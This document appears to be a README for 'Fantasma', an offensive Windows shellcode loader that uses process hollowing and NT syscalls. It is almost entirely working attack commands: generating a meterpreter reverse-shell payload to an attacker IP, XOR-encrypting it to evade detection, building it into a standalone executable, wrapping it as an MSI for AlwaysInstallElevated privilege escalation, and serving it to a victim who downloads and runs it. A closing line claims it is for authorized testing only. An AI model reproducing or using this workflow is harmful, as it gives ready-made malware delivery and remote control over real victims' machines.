# 👻 Fantasma

> Windows shellcode loader using process hollowing and NT syscalls. Cross-compiled from macOS via .NET SDK. Shellcode is XOR-encrypted and embedded as a resource inside the binary.

---

## How It Works

```
msfvenom (raw shellcode)
        ↓
XOR encrypt (custom key)
        ↓
Embed as resource in .NET project
        ↓
dotnet publish → single .exe (win-x64)
        ↓
Execution: CreateProcess (suspended) → NtWriteVirtualMemory → NtCreateThreadEx
```

---

## Requirements

- macOS (Apple Silicon or Intel)
- [.NET SDK 8+](https://dot.net)
- `msfvenom` (Metasploit Framework)
- Python 3

---

## Usage

### 1. Generate the shellcode

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<ATTACKER_IP> LPORT=443 \
  -f raw EXITFUNC=thread \
  -o shellcode_enc.bin
```

### 2. XOR encrypt the shellcode

```bash
python3 -c "
data = open('shellcode_enc.bin','rb').read()
key = b'HFDG*febMXL@uX8YkkPhJof*'
enc = bytes([b ^ key[i % len(key)] for i,b in enumerate(data)])
open('shellcode_enc.bin','wb').write(enc)
print('First 4 encrypted:', hex(enc[0]), hex(enc[1]), hex(enc[2]), hex(enc[3]))"
```

Or use the encoder script:

```bash
python3 tools/PostExp/XOR-Encoder/Xorshellcode.py shellcode_enc.bin
```

### 3. Place the encrypted shellcode

Copy `shellcode_enc.bin` into the project root (alongside `fantasma.csproj`).

### 4. Build

**Single file — self-contained (recommended, no .NET on victim):**

```bash
dotnet publish -r win-x64 -c Release \
  --self-contained true \
  -p:PublishSingleFile=true \
  -p:PublishTrimmed=true \
  -o ./output
```

**Self-contained, not trimmed (larger, more compatible):**

```bash
dotnet publish -r win-x64 -c Release --self-contained true
```

**32-bit (if needed):**

```bash
dotnet publish -r win-x86 -c Release --self-contained false
```

Output: `./output/fantasma.exe`

---

## Optional — Wrap as MSI (AlwaysInstallElevated)

```bash
msfvenom -p windows/exec \
  CMD='C:\users\public\fantasma.exe' \
  -f msi -o fantasma.msi
```

Deploy on victim:

```powershell
msiexec /quiet /qn /i fantasma.msi
```

---

## Project Structure

```
fantasma/
├── fantasma.csproj
├── Program.cs
└── shellcode_enc.bin   ← generated per session, not committed
```

---

## Verify shellcode before building

```bash
python3 -c "
data  = open('shellcode_enc.bin','rb').read()
key   = b'HFDG*febMXL@uX8YkkPhJof*'
dec   = bytes([b ^ key[i % len(key)] for i,b in enumerate(data)])
print('Encrypted (on disk):', ' '.join(f'{b:02X}' for b in data[:4]))
print('Decrypted (runtime):', ' '.join(f'{b:02X}' for b in dec[:4]))
print('Expected:             FC 48 83 E4')
print('Match:', dec[:4] == bytes([0xfc,0x48,0x83,0xe4]))"
```

---

## Full session workflow

```bash
# 1. Generate + encrypt
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f raw EXITFUNC=thread -o shellcode_enc.bin
python3 tools/PostExp/XOR-Encoder/Xorshellcode.py shellcode_enc.bin

# 2. Build
dotnet publish -r win-x64 -c Release --self-contained true -p:PublishSingleFile=true -p:PublishTrimmed=true -o ./output

# 3. Serve
python3 -m http.server 80 --directory ./output
```

On victim:

```powershell
curl http://<ATTACKER_IP>/fantasma.exe -o C:\users\public\fantasma.exe
C:\users\public\fantasma.exe
```

---

## Disclaimer

For authorized security testing and research only.

